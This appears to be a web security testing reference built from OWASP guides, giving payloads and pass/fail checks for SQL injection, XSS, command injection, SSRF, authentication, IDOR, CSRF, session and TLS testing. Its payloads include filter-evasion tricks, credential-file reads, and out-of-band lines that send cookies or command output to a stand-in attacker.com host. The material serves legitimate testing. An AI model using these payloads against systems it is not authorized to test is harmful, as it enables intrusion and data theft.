# OWASP Security Testing Methodology Reference

Scraped from OWASP Testing Guide v4.2, OWASP Top 10 2021, and OWASP ASVS.
This document contains **actual test logic** for implementing automated security tests.

---

## TABLE OF CONTENTS

1. [SQL Injection Testing](#1-sql-injection-testing)
2. [XSS Testing (Reflected & Stored)](#2-xss-testing)
3. [Command Injection Testing](#3-command-injection-testing)
4. [NoSQL Injection Testing](#4-nosql-injection-testing)
5. [SSRF Testing](#5-ssrf-testing)
6. [Authentication Testing](#6-authentication-testing)
7. [Authorization & IDOR Testing](#7-authorization--idor-testing)
8. [Privilege Escalation Testing](#8-privilege-escalation-testing)
9. [Session Management Testing](#9-session-management-testing)
10. [CSRF Testing](#10-csrf-testing)
11. [Error Handling Testing](#11-error-handling-testing)
12. [Cryptography / TLS Testing](#12-cryptography--tls-testing)
13. [OWASP Top 10 2021 - CWE Mappings](#13-owasp-top-10-2021---cwe-mappings)
14. [OWASP ASVS Verification Requirements](#14-owasp-asvs-verification-requirements)

---

## 1. SQL INJECTION TESTING

**WSTG ID:** WSTG-INPV-05
**CWE:** CWE-89 (SQL Injection)

### WHAT TO TEST
Any parameter that gets used in SQL queries: URL parameters, POST body fields, cookies, HTTP headers.

### HOW TO TEST - Specific Payloads

#### Step 1: Detection - Single Quote Test
Inject `'` into each parameter. If the response contains a SQL error or differs from normal, the parameter may be injectable.

```
https://example.com/items?id=1'
```

**PASS/FAIL:** If response shows SQL error (e.g., "You have an error in your SQL syntax", "ORA-01756", "unclosed quotation mark"), it FAILS.

#### Step 2: Boolean-Based Blind SQLi
```
https://example.com/items?id=1 AND 1=1   (should return normal)
https://example.com/items?id=1 AND 1=2   (should return different/empty)
```

**PASS/FAIL:** If both return the same response, likely not injectable. If they differ, FAIL.

#### Step 3: Union-Based SQLi
```
https://example.com/items?id=1 UNION SELECT NULL--
https://example.com/items?id=1 UNION SELECT NULL,NULL--
https://example.com/items?id=1 UNION SELECT NULL,NULL,NULL--
```
Increment NULLs until no error - reveals column count.

Then extract data:
```
https://example.com/items?id=1 UNION SELECT username,password FROM users--
```

#### Step 4: Time-Based Blind SQLi
```
# MySQL
https://example.com/items?id=1 AND SLEEP(5)--
# PostgreSQL
https://example.com/items?id=1; SELECT pg_sleep(5)--
# MSSQL
https://example.com/items?id=1; WAITFOR DELAY '0:0:5'--
```

**PASS/FAIL:** If response is delayed by ~5 seconds, FAIL.

#### Step 5: Error-Based SQLi
```
# MySQL
https://example.com/items?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
# MSSQL
https://example.com/items?id=1 AND 1=CONVERT(int, (SELECT @@version))--
```

#### Standard SQL Injection Payloads
```
'
''
`
``
,
"
""
/
//
\
\\
;
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' ({
' OR '' = '
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
OR 1=1
OR 1=1--
OR 1=1#
OR 1=1/*
admin' --
admin' #
admin'/*
') OR ('1'='1
') OR ('1'='1'--
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' UNION SELECT null--
1' UNION SELECT null,null--
1' UNION SELECT null,null,null--
```

### What to Check in Responses
- SQL error messages (MySQL, PostgreSQL, MSSQL, Oracle, SQLite keywords)
- Different response content for true/false conditions
- Time delays corresponding to injected sleep
- Database version information disclosure
- Unexpected data in response from UNION queries

---

## 2. XSS TESTING

### 2a. Reflected XSS (WSTG-INPV-01)
**CWE:** CWE-79

#### WHAT TO TEST
Every input vector: URL parameters, POST data, hidden form fields, HTTP headers (Referer, User-Agent).

#### HOW TO TEST

##### Step 1: Detect Input Vectors
Identify all parameters reflected in the response HTML.

##### Step 2: Inject Test Payloads
```
<script>alert(123)</script>
"><script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
" onfocus="alert(document.cookie)
javascript:alert(1)
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
```

##### Step 3: Check Response
Search the response HTML for the injected payload. Check if special characters were encoded.

**PASS/FAIL:**
- PASS: All `<`, `>`, `"`, `'`, `&` are HTML-entity encoded in the response
- FAIL: Payload appears unencoded in the response HTML

##### Filter Bypass Payloads
```
"><ScRiPt>alert(document.cookie)</ScRiPt>
"%3cscript%3ealert(document.cookie)%3c/script%3e
<scr<script>ipt>alert(document.cookie)</script>
<SCRIPT a=">" SRC="https://attacker/xss.js"></SCRIPT>
"><script >alert(document.cookie)</script >
<img src=x onerror="alert(1)">
<svg/onload=alert(1)>
<body/onload=alert(1)>
```

##### Context-Specific Payloads
- **Inside HTML attribute:** `" onfocus="alert(1)" autofocus="`
- **Inside JavaScript string:** `';alert(1)//` or `\';alert(1)//`
- **Inside URL:** `javascript:alert(1)` or `data:text/html,<script>alert(1)</script>`

### 2b. Stored XSS (WSTG-INPV-02)
**CWE:** CWE-79

#### HOW TO TEST
1. Identify all input points that store data (profile fields, comments, messages, file uploads)
2. Submit XSS payloads in stored fields
3. Navigate to the page where stored data is displayed
4. Check if the payload executes

**Key Stored XSS Input Points:**
- User profile fields (name, bio, avatar URL)
- Comments/forum posts
- File upload names and content
- Shopping cart items
- Application settings
- Log entries

#### File Upload XSS
```
POST /fileupload.aspx HTTP/1.1
Content-Disposition: form-data; name="uploadfile1"; filename="test.gif"
Content-Type: text/html

<script>alert(document.cookie)</script>
```

---

## 3. COMMAND INJECTION TESTING

**WSTG ID:** WSTG-INPV-12
**CWE:** CWE-78

### WHAT TO TEST
Parameters that may interact with OS commands: file operations, ping/network tools, PDF generators, image processors.

### HOW TO TEST

#### Command Chaining Operators (Both Windows & Unix)
```
cmd1|cmd2       # cmd2 executes regardless
cmd1||cmd2      # cmd2 only if cmd1 fails
cmd1&&cmd2      # cmd2 only if cmd1 succeeds
cmd1&cmd2       # cmd2 executes regardless (background)
```

#### Unix-Only Operators
```
cmd1;cmd2       # Sequential execution
$(cmd)          # Command substitution
`cmd`           # Command substitution (backticks)
>(cmd)          # Process substitution
```

#### Test Payloads
```
; whoami
| whoami
|| whoami
&& whoami
& whoami
$(whoami)
`whoami`
; cat /etc/passwd
| cat /etc/passwd
; sleep 5
| sleep 5
& timeout /t 5      (Windows)
| dir c:\            (Windows)
```

#### Blind Command Injection Detection
```
; sleep 5               # Time-based detection
; ping -c 5 127.0.0.1   # Time-based (5 seconds)
; curl http://attacker.com/$(whoami)   # Out-of-band
; nslookup attacker.com  # DNS out-of-band
; whoami > /var/www/html/output.txt    # Write to web root
```

#### Filter Evasion Techniques
```
# URL encoding
%3bwhoami          # ; encoded
%0awhoami          # newline

# Environment variable substitution (Linux)
${IFS}             # Space replacement
${PATH:0:1}        # / character
${LS_COLORS:10:1}  # ; character

# Bash brace expansion
{cat,/etc/passwd}  # cat /etc/passwd without spaces

# Character insertion
who\ami            # Backslash ignored
w$@hoami           # $@ ignored
wh'o'ami           # Quotes ignored (even number)

# Base64 encoding
;bash<<<$(base64 -d<<<d2hvYW1p)   # Decodes to 'whoami'

# Case modification (Windows)
WhoAmI
whoa^mi            # Caret ignored in CMD
```

#### Dangerous APIs by Language
| Language | Dangerous Functions |
|----------|-------------------|
| Java | `Runtime.exec()` |
| Python | `os.system()`, `os.popen()`, `subprocess.Popen()`, `subprocess.call()`, `eval()`, `exec()` |
| PHP | `system()`, `shell_exec()`, `exec()`, `proc_open()`, `eval()`, `passthru()` |
| Node.js | `child_process.exec()`, `execSync()`, `spawn()` |
| Ruby | `system()`, `exec()`, `Open3.popen3()` |
| Go | `exec.Command()` |
| C/C++ | `system()`, `exec()`, `ShellExecute()` |

**PASS/FAIL:**
- PASS: No command output in response, no time delays, no out-of-band callbacks
- FAIL: Command output visible, time delay matches injected sleep, or out-of-band request received

---

## 4. NOSQL INJECTION TESTING

**WSTG ID:** WSTG-INPV-05.6
**CWE:** CWE-943

### WHAT TO TEST
Parameters passed to NoSQL databases (primarily MongoDB).

### HOW TO TEST

#### Special Characters to Inject
```
' " \ ; { }
```
If these cause database errors, the input is not sanitized.

#### MongoDB-Specific Payloads
```
# Authentication bypass
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

# $where injection
0;var date=new Date(); do{curDate = new Date();}while(curDate-date<10000)

# Operator injection via HTTP parameters
username[$ne]=invalid&password[$ne]=invalid
username[$regex]=.*&password[$regex]=.*
username[$gt]=&password[$gt]=

# JSON body injection
{"username": {"$eq": "admin"}, "password": {"$ne": "wrong"}}
```

#### HTTP Parameter Pollution for $where
Create a variable named `$where` via parameter pollution to trigger MongoDB errors.

**PASS/FAIL:**
- PASS: Special characters do not cause errors; operator injections return access denied
- FAIL: Database errors on special chars, or unauthorized access via operator injection

---

## 5. SSRF TESTING

**WSTG ID:** WSTG-INPV-19
**CWE:** CWE-918

### WHAT TO TEST
Any parameter that accepts URLs or makes server-side requests (file imports, webhooks, URL previews, PDF generators).

### HOW TO TEST

#### Basic SSRF Payloads
```
# Access internal resources
http://localhost/admin
http://127.0.0.1/admin
http://127.0.0.1:8080/
http://[::1]/admin

# Read local files
file:///etc/passwd
file:///c:/windows/win.ini

# Cloud metadata endpoints
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Internal network scanning
http://192.168.1.1/
http://10.0.0.1/
http://172.16.0.1/
```

#### Filter Bypass Techniques
```
# Alternative IP representations for 127.0.0.1
2130706433          # Decimal
017700000001        # Octal
127.1               # Shortened
0x7f000001          # Hex

# URL obfuscation
https://expected-domain@attacker-domain
https://attacker-domain#expected-domain

# DNS rebinding
# Register domain that resolves to 127.0.0.1
```

#### PDF Generator SSRF
```html
<iframe src="file:///etc/passwd" width="400" height="400">
<img src="http://internal-server/secret">
<script>document.location="http://attacker.com/?c="+document.cookie</script>
```

**PASS/FAIL:**
- PASS: Server rejects internal URLs, file:// protocol, and non-allowlisted domains
- FAIL: Server fetches internal resources, returns file contents, or makes requests to attacker-controlled servers

---

## 6. AUTHENTICATION TESTING

### 6a. Brute Force / Weak Lockout (WSTG-ATHN-03)
**CWE:** CWE-307

#### HOW TO TEST
1. Attempt 3 invalid logins, then succeed with correct password (lockout should NOT trigger)
2. Attempt 4 invalid logins, then succeed (lockout should NOT trigger)
3. Attempt 5 invalid logins, then try correct password
4. If account locks at 5 attempts, test lockout duration (try at 5, 10, 15 min intervals)

```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=testuser&password=wrong1
username=testuser&password=wrong2
username=testuser&password=wrong3
username=testuser&password=wrong4
username=testuser&password=wrong5
# Now try correct password - should be locked
```

**PASS/FAIL:**
- PASS: Account locks after 5-10 failed attempts; lockout lasts 10-30 minutes; lockout timer resets
- FAIL: No lockout mechanism; unlimited login attempts possible; lockout bypassed via different IP

#### CAPTCHA Bypass Tests
1. Submit request without solving CAPTCHA
2. Submit with intentional wrong CAPTCHA answer
3. Re-submit previously valid CAPTCHA solution
4. Check if CAPTCHA appears only after failures - clear cookies to reset
5. Check alternative endpoints (API, mobile) for missing CAPTCHA

### 6b. Authentication Bypass (WSTG-ATHN-04)
**CWE:** CWE-287

#### HOW TO TEST

##### Parameter Modification
```
# Original
https://www.site.com/page.asp?authenticated=no
# Modified
https://www.site.com/page.asp?authenticated=yes
```

##### Direct Page Access
```
# Skip login, access protected page directly
https://www.site.com/admin/dashboard
https://www.site.com/api/users
```

##### Session ID Prediction
Collect multiple session IDs and analyze:
- Are they sequential/predictable?
- What parts change between sessions?
- Can the next ID be predicted?

##### SQL Injection on Login
```
username: admin' --
password: anything

username: ' OR '1'='1
password: ' OR '1'='1
```

### 6c. Credential Transport (WSTG-ATHN-01)
**CWE:** CWE-523

#### HOW TO TEST
- Check if login form uses HTTPS
- Check if credentials are in URL parameters (GET) vs POST body
- Check for HTTP to HTTPS redirect before login

**PASS/FAIL:**
- PASS: All authentication over HTTPS, credentials in POST body only
- FAIL: HTTP login page, credentials in URL, mixed content

---

## 7. AUTHORIZATION & IDOR TESTING

**WSTG ID:** WSTG-ATHZ-04
**CWE:** CWE-639 (IDOR), CWE-862 (Missing Authorization)

### WHAT TO TEST
Any parameter referencing objects: database IDs, filenames, user IDs.

### HOW TO TEST

#### Setup
Create 2+ user accounts with different permissions.

#### Test Patterns

##### Database Record Access
```
# User A's invoice
GET /api/invoices/12345
Authorization: Bearer USER_A_TOKEN

# Try User B's invoice with User A's token
GET /api/invoices/12346
Authorization: Bearer USER_A_TOKEN
```

##### User Profile Manipulation
```
# Change another user's password
POST /api/changepassword
{"user": "other_user", "newpassword": "hacked"}
Authorization: Bearer ATTACKER_TOKEN
```

##### File System Resource Access
```
GET /api/files/img00011
# Try incrementing
GET /api/files/img00012
```

##### Application Functionality Access
```
# Admin-only function with regular user session
POST /account/deleteEvent HTTP/1.1
Cookie: SessionID=REGULAR_USER_SESSION
EventID=1000001
```

**PASS/FAIL:**
- PASS: Accessing another user's resources returns 403 Forbidden
- FAIL: Resources of other users are accessible; response contains `{"message": "Event was deleted"}` with wrong user session

---

## 8. PRIVILEGE ESCALATION TESTING

**WSTG ID:** WSTG-ATHZ-03
**CWE:** CWE-269

### HOW TO TEST

#### Vertical Privilege Escalation
1. Register accounts at different privilege levels
2. Maintain sessions for each role
3. For every admin-only request, replay with lower-privilege session cookie

```
# Admin request
POST /admin/deleteUser HTTP/1.1
Cookie: SessionID=ADMIN_SESSION
userId=123

# Replay with regular user session
POST /admin/deleteUser HTTP/1.1
Cookie: SessionID=REGULAR_USER_SESSION
userId=123
```

#### Horizontal Privilege Escalation
```
# User A request
GET /api/profile?userId=1001
Cookie: SessionID=USER_A_SESSION

# Same request with User B's session
GET /api/profile?userId=1001
Cookie: SessionID=USER_B_SESSION
```

#### Hidden Field / Parameter Manipulation
```
# Check for hidden fields like:
<input type="hidden" name="profile" value="User">
# Change to:
<input type="hidden" name="profile" value="SysAdmin">

# Check for role parameters:
POST /api/updateProfile
{"role": "admin", "groupID": "grp001"}
```

#### IP-Based Bypass
```
# Add header to bypass IP restrictions
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
```

**PASS/FAIL:**
- PASS: All privilege-restricted operations verify server-side authorization; role manipulation has no effect
- FAIL: Lower-privilege users can access higher-privilege functions; hidden field manipulation grants elevated access

---

## 9. SESSION MANAGEMENT TESTING

### 9a. Session Management Schema (WSTG-SESS-01)
**CWE:** CWE-330 (Insufficient Randomness), CWE-384 (Session Fixation)

#### HOW TO TEST

##### Cookie Analysis Checklist
- [ ] All Set-Cookie directives tagged as `Secure`?
- [ ] All Set-Cookie directives tagged as `HttpOnly`?
- [ ] `SameSite` attribute set to `Strict` or `Lax`?
- [ ] Session cookies use `__Host-` prefix?
- [ ] Path attribute set appropriately?
- [ ] No persistent session cookies without valid Expires?

##### Session Token Randomness
1. Collect 100+ session tokens
2. Check for patterns: sequential, time-based, predictable portions
3. Verify minimum 64 bits of entropy
4. Session ID should be at least 50 characters long

##### Session Token Structure
Check if token contains decodable information:
```
# Look for Base64-encoded data
echo "TOKEN_VALUE" | base64 -d

# Check for hex-encoded data
echo "TOKEN_VALUE" | xxd -r -p

# Check if token contains: IP, username, timestamp, role
```

### 9b. Cookie Attributes (WSTG-SESS-02)
**CWE:** CWE-614 (Secure flag), CWE-1004 (HttpOnly flag)

#### Required Cookie Attributes (Automated Check)
```
Set-Cookie: __Host-SID=<token>; path=/; Secure; HttpOnly; SameSite=Strict
```

| Attribute | Required | Check |
|-----------|----------|-------|
| Secure | Yes | Cookie only sent over HTTPS |
| HttpOnly | Yes | Not accessible via JavaScript |
| SameSite | Strict or Lax | Prevents cross-site sending |
| __Host- prefix | Recommended | Ensures Secure, no Domain, Path=/ |
| Domain | Should NOT be set | Prevents subdomain cookie access |
| Path | / | Scoped to application root |
| Expires | Session-appropriate | Not excessively long |

**PASS/FAIL:**
- PASS: All session cookies have Secure, HttpOnly, SameSite=Strict/Lax
- FAIL: Missing any security attribute on session cookies

### 9c. Session Fixation (WSTG-SESS-03)
1. Note session token before login
2. Authenticate
3. Check if session token changes after login

**PASS/FAIL:**
- PASS: New session token issued after authentication
- FAIL: Same session token before and after login

---

## 10. CSRF TESTING

**WSTG ID:** WSTG-SESS-05
**CWE:** CWE-352

### WHAT TO TEST
State-changing operations: form submissions, API calls that modify data.

### HOW TO TEST

#### Check for CSRF Tokens
1. Inspect forms for hidden CSRF token fields
2. Check if token is unique per session
3. Check if token is validated server-side

#### Create CSRF PoC (GET)
```html
<img src="https://target.com/transfer?amount=1000&to=attacker" width="0" height="0">
```

#### Create CSRF PoC (POST)
```html
<html>
<body onload='document.CSRF.submit()'>
<form action='https://target.com/transfer' method='POST' name='CSRF'>
    <input type='hidden' name='amount' value='1000'>
    <input type='hidden' name='to' value='attacker'>
</form>
</body>
</html>
```

#### Create CSRF PoC (JSON POST)
```html
<html>
<body>
<form action='https://target.com/api/transfer' method='POST' enctype='text/plain'>
    <input type='hidden' name='{"amount":1000,"to":"attacker","padding":"' value='something"}' />
    <input type='submit' value='Submit' />
</form>
</body>
</html>
```

#### Checks
- [ ] Does the application use CSRF tokens?
- [ ] Is the token unique per session?
- [ ] Does removing the token cause the request to fail?
- [ ] Does changing the token value cause the request to fail?
- [ ] Is SameSite cookie attribute set?
- [ ] Does the app check Origin/Referer headers?

**PASS/FAIL:**
- PASS: State-changing requests require valid CSRF token; SameSite=Strict/Lax on session cookies
- FAIL: State-changing requests succeed without CSRF token from cross-origin page

---

## 11. ERROR HANDLING TESTING

**WSTG ID:** WSTG-ERRH-01
**CWE:** CWE-209 (Information Exposure Through Error), CWE-728

### HOW TO TEST

#### Trigger Errors
1. Request non-existent pages (404)
2. Request forbidden directories (403)
3. Send malformed HTTP requests (oversized path, broken headers)
4. Send wrong data types (string where integer expected)
5. Send special characters in all inputs
6. Send empty/null values for required fields
7. Send oversized payloads

#### What to Check in Error Responses
```
# Stack traces - FAIL if present:
- Java: "at com.example.class.method(File.java:123)"
- Python: "Traceback (most recent call last):"
- PHP: "Fatal error: ... in /path/to/file.php on line 123"
- .NET: "System.NullReferenceException"

# Server/framework version disclosure:
- "Apache/2.4.41"
- "nginx/1.18.0"
- "PHP/7.4.3"
- "X-Powered-By: Express"

# Database errors:
- "mysql_fetch_array()"
- "ORA-01756"
- "Microsoft OLE DB Provider for SQL Server"
- "PostgreSQL query failed"

# Internal path disclosure:
- "/var/www/html/"
- "C:\inetpub\wwwroot\"
```

**PASS/FAIL:**
- PASS: Generic error messages (e.g., "An error occurred"), no stack traces, no version info, no paths
- FAIL: Stack traces, SQL errors, server versions, internal paths, or debug info in responses

---

## 12. CRYPTOGRAPHY / TLS TESTING

**WSTG ID:** WSTG-CRYP-01
**CWE:** CWE-326 (Inadequate Encryption Strength), CWE-327 (Broken Crypto), CWE-1428 (HTTP instead of HTTPS)

### HOW TO TEST

#### Protocol Version Checks
| Protocol | Status |
|----------|--------|
| SSLv2 | MUST NOT be supported (DROWN) |
| SSLv3 | MUST NOT be supported (POODLE) |
| TLSv1.0 | SHOULD NOT be supported (BEAST) |
| TLSv1.1 | SHOULD NOT be supported (Deprecated by RFC 8996) |
| TLSv1.2 | SHOULD be supported |
| TLSv1.3 | SHOULD be supported (preferred) |

#### Cipher Suite Checks
Must reject:
- EXPORT ciphers (FREAK)
- NULL ciphers
- Anonymous ciphers
- RC4 ciphers (NOMORE)
- CBC mode ciphers (BEAST, Lucky 13)
- Weak DHE keys < 2048 bits (LOGJAM)

Must support:
- AES-128 or AES-256 in GCM mode
- ChaCha20-Poly1305
- ECDHE key exchange with P-256 or X25519

#### Certificate Checks
- [ ] Valid date range (not expired, not-yet-valid)
- [ ] Max lifespan 398 days (post Sept 2020)
- [ ] Signed by trusted CA
- [ ] Subject Alternative Name matches hostname
- [ ] Key size: RSA >= 3072 bits or ECDSA P-256+
- [ ] Signature uses SHA-256 or stronger
- [ ] No wildcard certs unless necessary

#### Application-Level TLS Checks
- [ ] HTTP redirects to HTTPS
- [ ] HSTS header present: `Strict-Transport-Security: max-age=31536000; includeSubDomains`
- [ ] No mixed content (HTTP resources on HTTPS pages)
- [ ] Session cookies have Secure flag
- [ ] No sensitive data over HTTP

#### Testing Tools
```bash
# sslyze
sslyze --regular target.com

# testssl.sh
./testssl.sh target.com

# nmap
nmap --script ssl-enum-ciphers -p 443 target.com

# openssl
openssl s_client -connect target.com:443 -tls1_2
openssl s_client -connect target.com:443 -ssl3    # Should fail

# SSL Labs (online)
https://www.ssllabs.com/ssltest/analyze.html?d=target.com
```

**PASS/FAIL:**
- PASS: Only TLS 1.2+ supported; strong cipher suites only; valid trusted certificate; HSTS enabled
- FAIL: SSLv2/3 or TLS 1.0/1.1 supported; weak ciphers; expired/self-signed cert; no HSTS

---

## 13. OWASP TOP 10 2021 - CWE MAPPINGS

### A01:2021 - Broken Access Control
**CWE Count:** 34
**Key CWEs:** CWE-200 (Sensitive Info Exposure), CWE-352 (CSRF), CWE-862 (Missing Authorization), CWE-22 (Path Traversal), CWE-23 (Relative Path Traversal), CWE-639 (IDOR)
**Test:** IDOR, privilege escalation, forced browsing, CORS misconfiguration, missing auth on API methods

### A02:2021 - Cryptographic Failures
**CWE Count:** 29
**Key CWEs:** CWE-259 (Hard-coded Password), CWE-327 (Broken Crypto Algorithm), CWE-331 (Insufficient Entropy)
**Test:** TLS configuration, password hashing (reject MD5/SHA1, require Argon2/bcrypt/scrypt), data-at-rest encryption, cleartext transmission

### A03:2021 - Injection
**CWE Count:** 33
**Key CWEs:** CWE-20 (Input Validation), CWE-74 (Injection), CWE-77 (Command Injection), CWE-78 (OS Command Injection), CWE-79 (XSS), CWE-89 (SQL Injection), CWE-90 (LDAP Injection), CWE-91 (XML Injection), CWE-94 (Code Injection), CWE-917 (Expression Language Injection)
**Full CWE list:** CWE-20, CWE-74, CWE-75, CWE-77, CWE-78, CWE-79, CWE-80, CWE-83, CWE-87, CWE-88, CWE-89, CWE-90, CWE-91, CWE-93, CWE-94, CWE-95, CWE-96, CWE-97, CWE-98, CWE-99, CWE-100, CWE-113, CWE-116, CWE-138, CWE-184, CWE-470, CWE-471, CWE-564, CWE-610, CWE-643, CWE-644, CWE-652, CWE-917
**Test:** SQL injection, XSS, command injection, LDAP injection, SSTI, expression language injection

### A04:2021 - Insecure Design
**CWE Count:** 40
**Key CWEs:** CWE-256 (Unprotected Storage of Credentials), CWE-501 (Trust Boundary Violation), CWE-522 (Insufficiently Protected Credentials), CWE-840 (Business Logic Errors), CWE-841 (Improper Enforcement of Behavioral Workflow)
**Test:** Business logic flaws, rate limiting, anti-automation, threat modeling coverage

### A05:2021 - Security Misconfiguration
**CWE Count:** 20
**Key CWEs:** CWE-16 (Configuration), CWE-611 (XXE), CWE-260 (Password in Config), CWE-614 (Insecure Cookie)
**Test:** Default credentials, unnecessary features enabled, verbose error messages, missing security headers, directory listing

### A06:2021 - Vulnerable and Outdated Components
**CWE Count:** 3
**Key CWEs:** CWE-937, CWE-1035, CWE-1104 (Unmaintained Third Party Components)
**Test:** Dependency scanning, version detection, CVE checking

### A07:2021 - Identification and Authentication Failures
**CWE Count:** 22
**Key CWEs:** CWE-287 (Improper Authentication), CWE-297 (Certificate Host Mismatch), CWE-384 (Session Fixation), CWE-521 (Weak Password Requirements), CWE-798 (Hard-coded Credentials), CWE-613 (Insufficient Session Expiration)
**Test:** Brute force, credential stuffing, default credentials, session management, MFA bypass, password policy

### A08:2021 - Software and Data Integrity Failures
**CWE Count:** 10
**Key CWEs:** CWE-345, CWE-353, CWE-426, CWE-494 (Code Download Without Integrity Check), CWE-502 (Deserialization of Untrusted Data), CWE-565, CWE-784, CWE-829, CWE-830, CWE-915
**Test:** Deserialization, unsigned software updates, CI/CD pipeline security, SRI for CDN resources

### A09:2021 - Security Logging and Monitoring Failures
**CWE Count:** 4
**Key CWEs:** CWE-117 (Improper Output Neutralization for Logs), CWE-223 (Omission of Security-relevant Info), CWE-532 (Sensitive Info in Log), CWE-778 (Insufficient Logging)
**Test:** Login logging, failed auth logging, access control failure logging, log injection prevention

### A10:2021 - Server-Side Request Forgery (SSRF)
**CWE Count:** 1
**Key CWEs:** CWE-918 (SSRF)
**Test:** Internal URL access, cloud metadata access, file:// protocol, DNS rebinding, filter bypass

---

## 14. OWASP ASVS VERIFICATION REQUIREMENTS

### ASVS v4.0.3 / v5.0.0 - Key Sections for Testing

The ASVS uses three levels:
- **Level 1:** Low assurance (penetration testable)
- **Level 2:** Most applications (moderate assurance)
- **Level 3:** Critical applications (high assurance)

Requirement format: `<chapter>.<section>.<requirement>` (e.g., `1.2.5`)

### V3: Session Management Requirements (ASVS v4.0.3)

| ID | Requirement | L1 | L2 | L3 | CWE |
|----|------------|----|----|-----|-----|
| 3.1.1 | Never reveal session tokens in URL parameters | Y | Y | Y | 598 |
| 3.2.1 | Generate new session token on user authentication | Y | Y | Y | 384 |
| 3.2.2 | Session tokens possess at least 64 bits of entropy | Y | Y | Y | 331 |
| 3.2.3 | Store session tokens only via secure methods (secure cookies or HTML5 session storage) | Y | Y | Y | 539 |
| 3.2.4 | Session tokens generated using approved cryptographic algorithms | - | Y | Y | 331 |
| 3.3.1 | Logout and expiration invalidate the session token | Y | Y | Y | 613 |
| 3.3.2 | Re-authentication occurs periodically (L1: 30d, L2: 12h/30min idle, L3: 12h/15min idle+2FA) | Y | Y | Y | 613 |
| 3.3.3 | Option to terminate all sessions after password change | - | Y | Y | 613 |
| 3.3.4 | Users can view and log out of active sessions | - | Y | Y | 613 |
| 3.4.1 | Cookie-based session tokens have Secure attribute | Y | Y | Y | 614 |
| 3.4.2 | Cookie-based session tokens have HttpOnly attribute | Y | Y | Y | 1004 |
| 3.4.3 | Cookie-based session tokens use SameSite attribute | Y | Y | Y | 16 |
| 3.4.4 | Cookie-based session tokens use __Host- prefix | Y | Y | Y | 16 |
| 3.4.5 | Path attribute set to most precise path | Y | Y | Y | 16 |
| 3.5.1 | Allow users to revoke OAuth tokens | - | Y | Y | 290 |
| 3.5.2 | Use session tokens rather than static API secrets | - | Y | Y | 798 |
| 3.5.3 | Stateless tokens use digital signatures/encryption against tampering | - | Y | Y | 345 |
| 3.7.1 | Full valid login session required before sensitive transactions | Y | Y | Y | 306 |

### ASVS v5.0 Key Chapter: Injection Prevention (V1.2)
Example requirement: `1.2.5` - "Verify that the application protects against OS command injection and that operating system calls use parameterized OS queries or use contextual command line output encoding."

### How ASVS Maps to Testing

| ASVS Chapter | Maps to WSTG Section | Primary Test |
|--------------|---------------------|-------------|
| V1 Encoding & Sanitization | 4.7 Input Validation | SQLi, XSS, Command Injection |
| V2 Authentication | 4.4 Authentication | Brute force, bypass, MFA |
| V3 Session Management | 4.6 Session Management | Cookie attrs, fixation, timeout |
| V4 Access Control | 4.5 Authorization | IDOR, privilege escalation |
| V5 Validation & Encoding | 4.7 Input Validation | Input sanitization |
| V6 Stored Cryptography | 4.9 Cryptography | At-rest encryption, hashing |
| V7 Error Handling & Logging | 4.8 Error Handling | Stack traces, info disclosure |
| V8 Data Protection | 4.9 Cryptography | TLS, data classification |
| V9 Communication | 4.9 Cryptography | TLS configuration |
| V10 Malicious Code | 4.7 Input Validation | Backdoors, logic bombs |
| V11 Business Logic | 4.10 Business Logic | Workflow bypass, rate limits |
| V12 Files & Resources | 4.7 Input Validation | File upload, path traversal |
| V13 API & Web Service | 4.12 API Testing | API security, GraphQL |
| V14 Configuration | 4.2 Configuration | Hardening, headers |

---

## APPENDIX: COMPLETE TEST CHECKLIST FOR AUTOMATED TESTING

### Per-Endpoint Tests (for each API endpoint / form):

1. **SQLi:** Send `'`, `' OR '1'='1`, `1 UNION SELECT NULL--`, `1 AND SLEEP(5)` in all params
2. **XSS:** Send `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>` in all params
3. **Command Injection:** Send `; whoami`, `| cat /etc/passwd`, `$(sleep 5)` in file/path params
4. **NoSQL Injection:** Send `{"$ne": ""}`, `{"$gt": ""}` in JSON body params
5. **SSRF:** Send `http://127.0.0.1`, `file:///etc/passwd`, `http://169.254.169.254/` in URL params
6. **Path Traversal:** Send `../../etc/passwd`, `..\..\windows\win.ini` in file params
7. **IDOR:** Access resources with IDs belonging to other users
8. **Auth Bypass:** Access endpoint without auth token; access with expired token
9. **Privilege Escalation:** Access admin endpoints with regular user token
10. **CSRF:** Check for CSRF tokens on state-changing endpoints
11. **Error Handling:** Send malformed input, check for stack traces in response
12. **Rate Limiting:** Send 100 rapid requests, check for rate limiting response

### Global Tests (per application):

1. **TLS:** Check protocol versions, cipher suites, certificate validity
2. **Security Headers:** HSTS, X-Frame-Options, X-Content-Type-Options, CSP, X-XSS-Protection
3. **Cookie Security:** Secure, HttpOnly, SameSite on all session cookies
4. **Session Management:** Token randomness, fixation, timeout, logout invalidation
5. **Password Policy:** Minimum length, complexity, common password rejection
6. **Account Lockout:** After 5-10 failed attempts, with appropriate duration
7. **HTTP Methods:** Reject unexpected methods (OPTIONS, TRACE, PUT, DELETE where not needed)
8. **CORS:** Check Access-Control-Allow-Origin is not `*` for authenticated endpoints
9. **Content-Type Validation:** Reject requests with unexpected Content-Type
10. **Default Credentials:** Check for admin/admin, test/test, etc.
